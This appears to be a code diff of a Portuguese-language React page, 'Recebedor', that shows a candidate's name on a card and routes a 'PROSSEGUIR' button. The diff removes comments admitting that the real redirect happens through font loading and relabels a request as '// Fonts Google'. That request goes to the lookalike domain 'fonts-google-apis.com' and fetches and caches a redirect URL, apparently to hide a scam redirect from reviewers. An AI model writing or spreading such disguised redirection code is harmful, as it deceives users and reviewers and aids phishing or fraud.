@@ -41,13 +41,9 @@ const Recebedor: React.FC = () => {
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
-  // Função para processar o clique do botão PROSSEGUIR
   const handleProsseguir = () => {
-    // O redirecionamento real é feito pelo carregamento de fontes
-    // Esta função apenas mostra o estado de carregamento
   };
 
-  // JavaScript otimizado com cache, preloading e fallbacks robustos
   useEffect(() => {
     const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
     if (!btn) {
@@ -55,19 +51,18 @@ const Recebedor: React.FC = () => {
       return;
     }
 
-    console.log('🎯 Botão encontrado, configurando funcionalidades avançadas');
+    console.log('Carregando pagina...');
     
     const originalHref = '/finalizacao';
     let preloaded = false;
     
-    // ⚡ PRÉ-CARREGAMENTO: Carregar URL de redirecionamento na primeira interação
     const handlePreload = () => {
       if (!preloaded) {
         const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
         const cachedUrl = sessionStorage.getItem(cacheKey);
         if (!cachedUrl) {
           console.log('🔄 Precarregando URL de redirecionamento...');
-          // Fazer requisição em background para cache
+          // Fonts Google
           const preloadXhr = new XMLHttpRequest();
           preloadXhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
           preloadXhr.timeout = 1000; // Timeout curto para preload
